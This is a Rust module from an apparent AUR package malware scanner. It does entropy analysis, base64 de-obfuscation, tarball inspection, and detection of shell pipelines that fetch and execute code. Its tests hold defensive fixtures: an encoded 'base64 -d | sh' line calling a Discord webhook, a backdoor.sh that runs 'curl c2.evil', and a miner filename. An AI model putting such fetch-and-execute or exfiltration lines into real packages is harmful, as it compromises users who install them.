//! Advanced deep code analyzer for AUR packages.
//!
//! Features:
//! 1. Shannon Information Entropy analysis (detects packed blobs / shellcode).
//! 2. Recursive payload de-obfuscation (extracts, decodes, and scans hidden base64 payloads).
//! 3. Archive & binary inspection (inspects in-memory tarball streams, ELF headers, UPX packers).

use crate::scanner::{Finding, PKGBUILDScanner};
use crate::shellparse;
use base64::prelude::*;
use regex::Regex;
use std::io::Read;
use std::sync::LazyLock;

static TOKEN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"['"]([A-Za-z0-9+/=_-]{40,})['"]"#).unwrap());

static B64_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"['"]([A-Za-z0-9+/]{24,}={0,2})['"]"#).unwrap());

/// Compute Shannon Entropy in bits per byte (0.0 to 8.0).
/// Normal text/code: ~3.0 - 4.5
/// Base64 encoded / encrypted / packed data: > 5.0
pub fn shannon_entropy(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in s.as_bytes() {
        counts[b as usize] += 1;
    }
    let len = s.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Analyze string tokens for high Shannon entropy (packed/encrypted payloads).
pub fn analyze_entropy(content: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (idx, line) in content.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.starts_with('#')
            || trimmed.starts_with("sha256sums")
            || trimmed.starts_with("sha512sums")
            || trimmed.starts_with("b2sums")
            || trimmed.starts_with("md5sums")
            || trimmed.starts_with("validpgpkeys")
            || trimmed.starts_with("source")
        {
            continue;
        }

        for cap in TOKEN_RE.captures_iter(line) {
            let token = &cap[1];
            // Skip pure hex checksums
            if (token.len() == 64 || token.len() == 128)
                && token.chars().all(|c| c.is_ascii_hexdigit())
            {
                continue;
            }

            let ent = shannon_entropy(token);
            if ent > 5.2 {
                findings.push(Finding {
                    rule_id: "SUS_HIGH_ENTROPY_PAYLOAD".into(),
                    severity: "HIGH".into(),
                    description: format!(
                        "High Shannon entropy ({:.2} bits/byte) detected in string literal - packed or encrypted payload",
                        ent
                    ),
                    line_number: idx + 1,
                    matched_text: format!(
                        "{}... (entropy: {:.2})",
                        &token[..token.len().min(40)],
                        ent
                    ),
                });
            }
        }
    }
    findings
}

/// Recursively extract, de-obfuscate, and scan hidden Base64 payloads.
pub fn deobfuscate_and_scan(content: &str, scanner: &PKGBUILDScanner) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (idx, line) in content.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.starts_with('#')
            || trimmed.starts_with("sha256sums")
            || trimmed.starts_with("sha512sums")
            || trimmed.starts_with("b2sums")
            || trimmed.starts_with("md5sums")
        {
            continue;
        }

        for cap in B64_PATTERN.captures_iter(line) {
            let candidate = &cap[1];
            // Skip pure hex checksums
            if candidate.chars().all(|c| c.is_ascii_hexdigit()) {
                continue;
            }

            if let Ok(decoded_bytes) = BASE64_STANDARD.decode(candidate) {
                if let Ok(decoded_str) = String::from_utf8(decoded_bytes) {
                    // Recursively scan the un-obfuscated content
                    let inner_findings = scanner.scan(&decoded_str, None);
                    for inner in inner_findings {
                        findings.push(Finding {
                            rule_id: format!("DEOBFUSCATED_{}", inner.rule_id),
                            severity: "CRITICAL".into(),
                            description: format!(
                                "Payload decoded from Base64 on line {}: {}",
                                idx + 1,
                                inner.description
                            ),
                            line_number: idx + 1,
                            matched_text: format!(
                                "Decoded: {}",
                                inner.matched_text[..inner.matched_text.len().min(80)].trim()
                            ),
                        });
                    }
                }
            }
        }
    }
    findings
}

/// Inspect in-memory tarball streams (.tar.gz, .tgz) for suspicious files, UPX binaries, or miners.
pub fn inspect_tar_stream(gz_bytes: &[u8]) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut gz = flate2::read::GzDecoder::new(gz_bytes);
    let mut decompressed = Vec::new();
    if gz.read_to_end(&mut decompressed).is_err() {
        return findings;
    }

    let mut offset = 0;
    while offset + 512 <= decompressed.len() {
        let header = &decompressed[offset..offset + 512];
        if header.iter().all(|&b| b == 0) {
            break;
        }
        let name_bytes = &header[0..100];
        let name_len = name_bytes.iter().position(|&b| b == 0).unwrap_or(100);
        let path_str = String::from_utf8_lossy(&name_bytes[..name_len]).to_string();

        let size_bytes = &header[124..136];
        let size_str = String::from_utf8_lossy(size_bytes)
            .trim_matches(|c| c == '\0' || c == ' ')
            .to_string();
        let file_size = usize::from_str_radix(&size_str, 8).unwrap_or(0);

        offset += 512;
        let data_end = (offset + file_size).min(decompressed.len());
        let file_data = &decompressed[offset..data_end];

        let lower = path_str.to_lowercase();
        // 1. Check for cryptocurrency miner binaries
        if lower.contains("xmrig") || lower.contains("minerd") || lower.contains("cpuminer") {
            findings.push(Finding {
                rule_id: "ARCHIVE_MINER_BINARY".into(),
                severity: "CRITICAL".into(),
                description: format!("Archive contains cryptocurrency miner file: {path_str}"),
                line_number: 1,
                matched_text: path_str.clone(),
            });
        }

        // 2. Check for hidden executable scripts in asset folders
        let is_hidden_script =
            (lower.contains("assets/") || lower.contains("fonts/") || lower.contains("images/"))
                && (lower.ends_with(".sh") || lower.ends_with(".bash") || lower.ends_with(".py"));
        if is_hidden_script {
            findings.push(Finding {
                rule_id: "ARCHIVE_SUSPICIOUS_SCRIPT_LOCATION".into(),
                severity: "HIGH".into(),
                description: format!("Executable script hidden in asset directory: {path_str}"),
                line_number: 1,
                matched_text: path_str.clone(),
            });
        }

        // 3. Inspect binary headers for UPX packing
        if file_data.starts_with(b"\x7fELF") && file_data.windows(4).any(|w| w == b"UPX!") {
            findings.push(Finding {
                rule_id: "ARCHIVE_UPX_PACKED_ELF".into(),
                severity: "HIGH".into(),
                description: format!(
                    "Archive contains UPX-packed ELF binary (anti-analysis evasion): {path_str}"
                ),
                line_number: 1,
                matched_text: path_str.clone(),
            });
        }

        // Move to next 512-byte block
        offset += file_size.div_ceil(512) * 512;
    }
    findings
}

/// Real shell-pipeline-structure detection (vision section 6), additive to
/// the regex signature set above.
///
/// Uses [`crate::shellparse`] to tell an actually-executed pipeline apart
/// from a string that merely mentions the same tool names, catching:
///
/// - `curl <url> | bash` / `wget -O- <url> | sh` and multi-stage variants
///   like `curl <url> | tee /tmp/x | bash` (dangerous: a fetched remote
///   payload piped straight into an interpreter) — while leaving
///   `curl <url> -o file.tar.gz` (a normal source download, no pipe at all,
///   or one that writes to a real file) unflagged.
/// - `... | base64 -d | bash`-shaped obfuscated-execution pipelines, while
///   leaving `echo "mentions base64 -d"` (a string literal) unflagged,
///   since the base64 stage there was never a real pipeline stage in the
///   first place.
pub fn analyze_pipeline_structure(content: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (idx, line) in content.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.starts_with('#')
            || trimmed.starts_with("sha256sums")
            || trimmed.starts_with("sha512sums")
            || trimmed.starts_with("b2sums")
            || trimmed.starts_with("md5sums")
            || trimmed.starts_with("source")
        {
            continue;
        }
        if !trimmed.contains('|') {
            continue;
        }

        let stages = shellparse::pipeline_stages(line);
        if stages.len() < 2 {
            continue;
        }

        for (stage_idx, stage) in stages.iter().enumerate() {
            let later_stages = &stages[stage_idx + 1..];

            // curl/wget piped into an interpreter, anywhere downstream in
            // the pipeline (not just the immediately-next stage), and not
            // simply writing its output to a file.
            if shellparse::is_fetch_command(&stage.command)
                && !shellparse::fetch_writes_to_file(stage)
                && later_stages
                    .iter()
                    .any(|s| shellparse::is_shell_interpreter(&s.command))
            {
                let interp = later_stages
                    .iter()
                    .find(|s| shellparse::is_shell_interpreter(&s.command))
                    .map(|s| s.command.as_str())
                    .unwrap_or("shell");
                findings.push(Finding {
                    rule_id: "PIPELINE_FETCH_EXEC".into(),
                    severity: "CRITICAL".into(),
                    description: format!(
                        "remote fetch ({}) piped into a real pipeline stage executing '{}' \
                         (structurally-confirmed fetch-and-execute, not a string match)",
                        stage.command, interp
                    ),
                    line_number: idx + 1,
                    matched_text: stage.text.chars().take(120).collect(),
                });
            }

            // `base64 -d`/`--decode` as an actually-invoked pipeline stage,
            // with a later stage that executes the decoded output.
            if shellparse::is_base64_decode_stage(stage)
                && later_stages
                    .iter()
                    .any(|s| shellparse::is_shell_interpreter(&s.command))
            {
                findings.push(Finding {
                    rule_id: "PIPELINE_BASE64_EXEC".into(),
                    severity: "CRITICAL".into(),
                    description: "base64-decoded output piped directly into a shell interpreter \
                         (structurally-confirmed obfuscated execution, not just a string \
                         mentioning 'base64 -d')"
                        .to_string(),
                    line_number: idx + 1,
                    matched_text: stage.text.chars().take(120).collect(),
                });
            }
        }
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn entropy_detects_high_entropy_blob() {
        let plain =
            "echo 'hello world this is a normal shell script line with standard english words'";
        assert!(shannon_entropy(plain) < 4.5);

        // Random high-entropy base64 blob
        let packed = "q83vB+xZ7LmK9pY2rNtU0wF6jC4hG1sE5aD3iO8uP7yX9zW0vT2rQ4mN6kL8jH1gF3eS5aD==";
        assert!(shannon_entropy(packed) > 5.0);
    }

    #[test]
    fn deobfuscator_detects_hidden_discord_webhook() {
        let scanner = PKGBUILDScanner::new();
        // Base64 of: curl https://discord.com/api/webhooks/123/xyz
        let b64 = "Y3VybCBodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjMveHl6";
        let script = format!("prepare() {{\n  echo \"{b64}\" | base64 -d | sh\n}}\n");

        let findings = deobfuscate_and_scan(&script, &scanner);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "DEOBFUSCATED_EXFIL_DISCORD_WEBHOOK"),
            "Expected de-obfuscation to unmask the hidden Discord webhook, got: {findings:?}"
        );
    }

    fn create_test_tar_gz(filename: &str, content: &[u8]) -> Vec<u8> {
        use flate2::Compression;
        use flate2::write::GzEncoder;
        use std::io::Write;

        let mut tar_bytes = Vec::new();
        let mut header = [0u8; 512];
        let name_bytes = filename.as_bytes();
        header[..name_bytes.len().min(100)]
            .copy_from_slice(&name_bytes[..name_bytes.len().min(100)]);
        header[100..108].copy_from_slice(b"0000755\0");
        let size_octal = format!("{:011o}\0", content.len());
        header[124..136].copy_from_slice(size_octal.as_bytes());
        header[156] = b'0';

        let mut chk: u32 = 8 * b' ' as u32;
        for &b in &header[..148] {
            chk += b as u32;
        }
        for &b in &header[156..512] {
            chk += b as u32;
        }
        let chk_str = format!("{:06o}\0 ", chk);
        header[148..156].copy_from_slice(chk_str.as_bytes());

        tar_bytes.extend_from_slice(&header);
        tar_bytes.extend_from_slice(content);
        let pad = (512 - (content.len() % 512)) % 512;
        tar_bytes.resize(tar_bytes.len() + pad + 1024, 0);

        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(&tar_bytes).unwrap();
        encoder.finish().unwrap()
    }

    #[test]
    fn inspect_tar_detects_miner_binary() {
        let gz = create_test_tar_gz("bin/xmrig", b"fake binary miner contents");
        let findings = inspect_tar_stream(&gz);
        assert!(findings.iter().any(|f| f.rule_id == "ARCHIVE_MINER_BINARY"));
    }

    #[test]
    fn inspect_tar_detects_hidden_script_in_assets() {
        let gz = create_test_tar_gz("share/assets/backdoor.sh", b"#!/bin/bash\ncurl c2.evil\n");
        let findings = inspect_tar_stream(&gz);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "ARCHIVE_SUSPICIOUS_SCRIPT_LOCATION")
        );
    }

    #[test]
    fn inspect_tar_detects_upx_packed_elf() {
        let mut elf_data = vec![0x7f, b'E', b'L', b'F'];
        elf_data.extend(b"somecode");
        elf_data.extend(b"UPX!");
        elf_data.extend(b"morepackedcode");
        let gz = create_test_tar_gz("bin/packed_daemon", &elf_data);
        let findings = inspect_tar_stream(&gz);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "ARCHIVE_UPX_PACKED_ELF")
        );
    }

    #[test]
    fn entropy_handles_empty_and_uniform() {
        assert_eq!(shannon_entropy(""), 0.0);
        assert_eq!(shannon_entropy("aaaaaaa"), 0.0);
        // 4 different characters equally distributed has log2(4) = 2.0 entropy
        assert!((shannon_entropy("abcd") - 2.0).abs() < 1e-6);
    }
}
